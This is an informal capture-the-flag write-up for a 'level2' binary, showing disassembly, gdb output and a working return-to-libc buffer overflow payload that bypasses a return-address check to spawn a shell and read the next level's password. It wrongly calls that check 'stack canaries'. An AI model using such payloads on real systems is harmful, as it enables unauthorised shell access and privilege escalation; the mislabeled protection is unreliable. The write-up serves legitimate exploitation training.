( realy fast md because it is late XD )

So, the exploit is without surprise a buffer overflow.

It can be done because gets is call by seeing this line :
```
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
```
the main difference are those lines in the dump
```
 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax
 804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 804850f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048513:	89 04 24             	mov    %eax,(%esp)
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
```
so somewhere in the code, there is a checkin that look like that
```c

if ((somthing & 0xb0000000) == 0xb0000000) {
    printf("something....");
    exit(1);
}
```

what is does is that it prevent previous command to overwrite the return adress to an adress on the stack.

we can see that by trying to do a basic buffer overflow (the adress on the command are explained later):
```
( python -c "print('X' * 80 + '\x60\xb0\xe6\xb7' + 'D' * 4 + '\x58\xcc\xf8\xb7')" ; cat ) | ./level2
```
it returns ```(0xb7e6b060)``` 

*reminder : usualy it returns the value without parentheses so here the if and printf is trigger because there is only one printf that could have had append the ()*

The check is done after the gets operation so i just decided to return before the check.

After futher research, I discovered that the protection is called a **Stack canaries**

further below we can see the return code of the function and we just have to put this adress just before the overflow :
```
 804853e:	c3                   	ret    
```

Here is a code that show the adress of system and "/bin/sh".
```
(gdb) b main
Breakpoint 1 at 0x8048483
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048483 in main ()
(gdb) print &system
$4 = (<text variable, no debug info> *) 0xb7e6b060 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

# !! TODO : explain how to find the overflow size


putting it all together, we just have to execute
```
( python -c "print('X' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'D' * 4 + '\x58\xcc\xf8\xb7')" ; cat ) | ./level2
```

and TADA we have a shell with level3 rights !!

then just go to /home/user/level3 and cat .pass and we have the flag
